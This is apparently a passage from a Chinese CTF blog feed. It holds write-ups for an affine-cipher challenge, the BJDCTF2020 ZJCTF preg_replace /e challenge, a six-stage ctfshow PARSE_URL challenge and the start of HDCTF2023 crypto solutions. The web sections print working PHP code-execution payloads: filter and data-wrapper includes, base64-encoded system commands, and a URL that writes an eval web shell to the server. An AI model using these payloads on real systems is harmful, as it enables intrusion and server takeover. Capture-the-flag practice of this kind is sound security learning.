key<br><br>modulus = <span class="hljs-number">256</span><br><br>ciphertext = []<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    ciphertext.append((key[<span class="hljs-number">0</span>]*f + key[<span class="hljs-number">1</span>]) % modulus)          <span class="hljs-comment"># </span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ciphertext).<span class="hljs-built_in">hex</span>())<br><br><span class="hljs-comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span><br></code></pre></td></tr></table></figure><p>仿射密码五个字符<br>思路是复用加密，利用<code>flag&#123;</code>爆破出 key[0] 和 key[1]<br>然后利用解密函数解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">200</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (-<span class="hljs-number">200</span>,<span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">if</span> (a*<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;f&#x27;</span>)+b)%<span class="hljs-number">256</span> == <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;dd&#x27;</span>,<span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> (a*<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;l&#x27;</span>)+b)%<span class="hljs-number">256</span> == <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;43&#x27;</span>,<span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> (a*<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+b)%<span class="hljs-number">256</span> == <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;88&#x27;</span>,<span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> (a*<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;g&#x27;</span>)+b)%<span class="hljs-number">256</span> == <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;ee&#x27;</span>,<span class="hljs-number">16</span>):<br>            <span class="hljs-built_in">print</span>(a,b)<br><br>a=<span class="hljs-string">&#x27;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>   <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">241</span>*(<span class="hljs-built_in">int</span>(a[i:i+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">23</span>)%<span class="hljs-number">256</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#17 23</span><br><span class="hljs-comment">#flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>${}与preg_replace_e模式命令执行--[BJDCTF2020]ZJCTF</title>
    <link href="/2023/09/19/$%7B%7D%E4%B8%8Epreg_replace_e%E6%A8%A1%E5%BC%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--%5BBJDCTF2020%5DZJCTF/"/>
    <url>/2023/09/19/$%7B%7D%E4%B8%8Epreg_replace_e%E6%A8%A1%E5%BC%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--%5BBJDCTF2020%5DZJCTF/</url>
    
    <content type="html"><![CDATA[<p><strong>总结：</strong><code>**$&#123;&#125;**</code><strong>可以命令执行，5.6.x 版本php</strong><code>**preg_replace**``**/e**</code><strong>模式存在命令执行，对一个正则表达式模式或部分模式 两边添加圆括号 将导致反向引用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br><br>error_reporting(<span class="hljs-number">0</span>);<br>$text = $_GET[<span class="hljs-string">&quot;text&quot;</span>];<br>$file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(isset($text)&amp;&amp;(file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    echo <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$file))&#123;<br>        die(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    include($file);  //<span class="hljs-built_in">next</span>.php<br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p><code>/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code><br />post <code>I have a dream</code>拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>    <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>    <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>    <span class="hljs-variable">$str</span><br>  );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>  @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>分析一下代码：<br />显眼的定义了<code>getFlag()</code>方法可以命令执行<br />唯一输入点<code>$id = $_GET[&#39;id&#39;]</code><br />重点在<code>complex</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>    <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>    <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>    <span class="hljs-variable">$str</span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><code>complex</code>接受两个参数并返回一个正则匹配的结果<br />来看看这个正则<br /><code>preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, $str);</code><br />把<code>$str</code>中匹配到的<code>$re</code>全替换为<code>strtolower(&quot;\\1&quot;)</code><br />然后<br /><code>foreach($_GET as $re =&gt; $str) &#123;echo complex($re, $str). &quot;\n&quot;;&#125;</code><br />调用了<code>complex</code>方法，并且因为<code>foreach($_GET as $re =&gt; $str)</code>导致<br /><code>$re $str</code> 两个变量都可控<br /><code>$re</code> 为get传入的参数名，<code>$str</code>为传入参数的值<br />这里面 <code>preg_replace</code> 使用了 <code>/e </code>模式，导致代码执行，函数的第二个参数可以被执行</p><blockquote><p><strong>反向引用</strong><br>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><p><strong>这里的</strong><code>**strtolower(&quot;\\1&quot;)**</code><strong>相当于 \1，也就是匹配到的第一个字符串，这样就可以通过两个可控变量</strong><code>**$re $str**</code><strong>来构造命令执行</strong><br />在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。<br /><img src="https://c.img.dasctf.com/images/2023919/1695135701111-9a6f74d3-ed3c-497f-8692-c1c107c66ce4.png"><br />php声明变量有几种方式  <code>$&#123;a&#125;==$a==&#123;$&#123;a&#125;&#125;</code><br /><img src="https://c.img.dasctf.com/images/2023919/1695135731758-8c450d0d-d953-440e-a8ec-0a49a747245b.png"><br /><strong>如果${}里面是一个方法会发生什么</strong><br /><img src="https://c.img.dasctf.com/images/2023919/1695135741307-1f4147ae-bbcf-400b-88de-d5fe732c2eb7.png"><br />可以看到执行了phpinfo()<br />回到题目<br />传入<code>?\S*=$&#123;phpinfo()&#125;</code><br />由于<code>foreach($_GET as $re =&gt; $str) &#123;echo complex($re, $str). &quot;\n&quot;;&#125;</code><br />得到<code>$re=\S*</code> <code> $str=$&#123;phpinfo()&#125;</code>     ///<code> \S*</code>匹配一个任意非空白字符  <br />则<code>preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, $str);</code><br />变成<code>preg_replace(&#39;/(\S*)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;, $&#123;phpinfo()&#125;);</code><br />该正则会执行<code>strtolower(&quot;\\1&quot;)</code>匹配之后就相当于执行<code>strtolower(&quot;$&#123;phpinfo()&#125;&quot;)</code>  //strtolower把所有字符转换为小写<br />此时phpinfo()会被执行<br /><img src="https://c.img.dasctf.com/images/2023919/1695135749130-d1553763-9b92-401e-975d-f2ca79bbbded.png"><br />成功执行phpinfo()<br />同样可以执行题目给的<code>getFlag()</code>方法<br /><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;whoami&#39;);</code>==<code>?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=system(&#39;whoami&#39;);</code><br /><img src="https://c.img.dasctf.com/images/2023919/1695136834207-43312e2c-ec7c-46e9-965c-dc1c0f3b09a7.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-周末大挑战2023.5.12-PARSE_URL</title>
    <link href="/2023/05/16/ctfshow-%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%982023.5.12-PARSE_URL/"/>
    <url>/2023/05/16/ctfshow-%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%982023.5.12-PARSE_URL/</url>
    
    <content type="html"><![CDATA[<h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$data = parse_url($_GET[<span class="hljs-string">&#x27;u&#x27;</span>])<span class="hljs-comment">;</span><br><br><span class="hljs-built_in">eval</span>($data[<span class="hljs-string">&#x27;host&#x27;</span>])<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="https://c.img.dasctf.com/images/2023516/1684222941259-85d9a70b-8d78-4329-8dd6-1ff4eb990e0b.png"><br>通过<code>parse_url</code>数组获取的 get的u的值来命令执行<br>payload<code>?u=[http://system(&#39;cd](http://system(&#39;cd) ..;cd ..;cd ..;tac f*&#39;);</code><br><code>?u=http://system(&#39;ls&#39;);</code>得到<code>index.php init.php </code><br><code>?u=[http://system(&#39;ls](http://system(&#39;ls) /&#39;);</code>无回显<br>尝试<code>?u=[http://system(&#39;cat](http://system(&#39;cat) index.php&#39;);</code>无回显，推断过滤了/和cat<br>通过命令拼接回到根目录<code>?u=[http://system(&#39;cd](http://system(&#39;cd) ..;cd ..;cd ..;ls&#39;);</code>-&gt;<code>bin dev etc flag_is_here.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </code><br>也可以通过编码绕过，反引号执行<br><img src="https://c.img.dasctf.com/images/2023516/1684222972272-82e9bcd6-6cdb-4bdd-bbd5-a6177243da5a.png"><br>eval<code>system(&#39;echo bHMgLw==|base64 -d&#39;);</code>得到 <code>ls /</code>就获取了命令的字符串，然后通过反引号执行<br><code>?u=[http://system(&quot;</code>echo](<a href="http://system(&quot;`echo)/">http://system(&quot;`echo)</a> bHMgLw==|base64 -d<code>&quot;);</code> == ls/<br><code>?u=[http://system(&quot;</code>echo](<a href="http://system(&quot;`echo)/">http://system(&quot;`echo)</a> dGFjIC9mKg==|base64 -d<code>&quot;);</code> ==tac /f*</p><h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-variable">$data</span> = parse_url(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;host&#x27;</span>].<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_SCHEME));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_USER));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PASS));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_HOST));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PORT));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PATH));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_QUERY));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_FRAGMENT));<br><span class="hljs-meta">?&gt;</span><br>输出：<br><span class="hljs-keyword">array</span>(<span class="hljs-number">8</span>) &#123;<br>  [<span class="hljs-string">&quot;scheme&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br>  [<span class="hljs-string">&quot;host&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;hostname&quot;</span><br>  [<span class="hljs-string">&quot;port&quot;</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">9090</span>)<br>  [<span class="hljs-string">&quot;user&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;username&quot;</span><br>  [<span class="hljs-string">&quot;pass&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;password&quot;</span><br>  [<span class="hljs-string">&quot;path&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;/path&quot;</span><br>  [<span class="hljs-string">&quot;query&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;arg=value&quot;</span><br>  [<span class="hljs-string">&quot;fragment&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;anchor&quot;</span><br>&#125;<br><span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;hostname&quot;</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">9090</span>)<br><span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;/path&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;arg=value&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;anchor&quot;</span><br></code></pre></td></tr></table></figure><p><code>include</code>用伪协议<br><code>$data[&#39;host&#39;].$data[&#39;path&#39;];</code>对host和path的值拼接<br>应该是倒着来读取的，data后面要加两个冒号<br>这样host==<code>data:</code>path==<code>//text/plain;base64,PD9waHAgZXZhbChzeXN0ZW0oJ2xzIC8nKSk7Pz4=</code>有一个冒号被当作port，不会被读取<br><code>?u=//data:://text/plain;base64,PD9waHAgZXZhbChzeXN0ZW0oJ2xzIC8nKSk7Pz4=</code> ls /<br>得到：<br><code>_f1ag_1s_h3re.txt bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var  </code><br><code>?u=//data:://text/plain;base64,PD9waHAgZXZhbChzeXN0ZW0oJ3RhYyAvX2YxYWdfMXNfaDNyZS50eHQnKSk7Pz4=</code>  <?php eval(system('tac /_f1ag_1s_h3re.txt'));?></p><h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$data</span> = parse_url(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>].<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br></code></pre></td></tr></table></figure><p>payload:<br><code>?u=data:://username:password@hostname:9090//text/plain;base64,PD9waHAgZXZhbChzeXN0ZW0oJ3RhYyAvX2YxYV9nXzFzX2gzcmUnKSk7Pz4=</code><br>同样data协议，data加一个冒号</p><h1 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h1><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">$data = parse_url($_GET[<span class="hljs-string">&#x27;u&#x27;</span>]);<br><br><span class="hljs-keyword">system</span>($data[<span class="hljs-string">&#x27;host&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>ls /的根目录会被当作path<br>和第一题一样cd回去根目录<br><code>?u=[http://username:password@cd](http://username:password@cd) ..;cd ..;cd ..;cat 1_f1ag_1s_h3re</code></p><h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">extract(parse_url(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;u&#x27;</span>]));<br>include <span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>host;<br></code></pre></td></tr></table></figure><p><img src="https://c.img.dasctf.com/images/2023516/1684222994643-3080ee98-639c-46d0-a21e-38f0f78b7190.png"><br>把数组的键值赋值给键名做变量<br>$$$$$$host就是套了几层变量<br>通过相互赋值变量名就可以<br>get：<code>?u=user://pass:fragment@scheme/?php://input%23query</code><br>通过包含php文件，input输入流传入就行<br>post：<code>&lt;?php system(&#39;cat /_f1ag_1s_h3ree&#39;);?&gt;</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$host</span>=scheme</span><br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>host=<span class="hljs-symbol">$</span>scheme=user<br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>host=<span class="hljs-symbol">$</span>user=pass<br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>host=<span class="hljs-symbol">$</span>pass=fragment<br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>host=<span class="hljs-symbol">$</span>fragment=query<br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>host=<span class="hljs-symbol">$</span>query=php:<span class="hljs-comment">//input</span><br></code></pre></td></tr></table></figure><p><img src="https://c.img.dasctf.com/images/2023516/1684223020684-cf855156-45fa-4d2c-a23b-55fd029fbecc.png"></p><h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">$data = parse<span class="hljs-constructor">_url($<span class="hljs-params">_GET</span>[&#x27;<span class="hljs-params">u</span>&#x27;])</span>;<br><br>file<span class="hljs-constructor">_put_contents($<span class="hljs-params">data</span>[&#x27;<span class="hljs-params">path</span>&#x27;], $<span class="hljs-params">data</span>[&#x27;<span class="hljs-params">host</span>&#x27;])</span>;<br></code></pre></td></tr></table></figure><p><img src="https://c.img.dasctf.com/images/2023516/1684223038960-a70c7faa-5815-46d7-93e5-8f1ff6b4db4f.png"><br>path字段传php文件名，host字段传php代码，访问文件实现rce<br>host字段不支持&lt;?php&gt;标签<br>用&lt;script标签代替<br><code>?u=http://&lt;script language=&#39;php&#39;&gt;eval($_GET[1]);/var/www/html/a.php</code><br><img src="https://c.img.dasctf.com/images/2023516/1684223062950-869a8c35-d880-466e-b3ac-fbd4eca07e97.png"><br><code>a.php?1=system(&#39;cat /_f1a_g_1s_h3re&#39;);</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HDCTF2023-wp</title>
    <link href="/2023/04/23/HDCTF/"/>
    <url>/2023/04/23/HDCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="爬过小山去看云"><a href="#爬过小山去看云" class="headerlink" title="爬过小山去看云"></a>爬过小山去看云</h3><p>由题目名字知道是hill+云影<br><img src="https://c.img.dasctf.com/images/2023423/1682224725212-b9053b4d-6e8f-4672-94fe-268531f221fc.png"><br>得到密钥矩阵 3 4 19 11<br><img src="https://c.img.dasctf.com/images/2023423/1682224770638-7231e88d-f2d3-48f0-bdba-7f7289e620b2.png"><br><img src="https://c.img.dasctf.com/images/2023423/1682224985049-4cc3b77b-1184-492e-b729-4668ef13cc82.png"><br>随波逐流<br><img src="https://c.img.dasctf.com/images/2023423/1682224985898-24e612f0-6e54-4f91-890d-97b3fe69df37.png"><br><code>NSSCTF&#123;NOTFLAG&#125;</code></p><h3 id="Normal-Rsa"><a href="#Normal-Rsa" class="headerlink" title="Normal_Rsa"></a>Normal_Rsa</h3><p>打开就有flag</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs 1c">from Crypto.Util.number import *<br><span class="hljs-meta">#from shin import flag</span><br><br><br>m=bytes_to_long(b&#x27;HDCTF&#123;0b<span class="hljs-number">3663</span>ed-67e4-44e2-aee7-7c2d<span class="hljs-number">8665</span>b63c&#125;&#x27;)<br>e=<span class="hljs-number">65537</span><br>p=getPrime(<span class="hljs-number">256</span>)<br><span class="hljs-meta">#q=getPrime(512)</span><br>q=<span class="hljs-number">6704006258427795304220450411280948926213189680360135534636452074716135019217911134480777251273836898349926894302122011679095979445240343891749741039976761</span><br>r=getPrime(<span class="hljs-number">512</span>)<br>n=p*q*r<br>P=<span class="hljs-built_in">pow</span>(p,<span class="hljs-number">2</span>,n)<br>Q=<span class="hljs-built_in">pow</span>(q,<span class="hljs-number">2</span>,n)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>print(f<span class="hljs-string">&quot;P = &#123;P&#125;&quot;</span>)<br>print(f<span class="hljs-string">&quot;Q = &#123;Q&#125;&quot;</span>)<br>print(f<span class="hljs-string">&quot;n = &#123;n&#125;&quot;</span>)<br>print(f<span 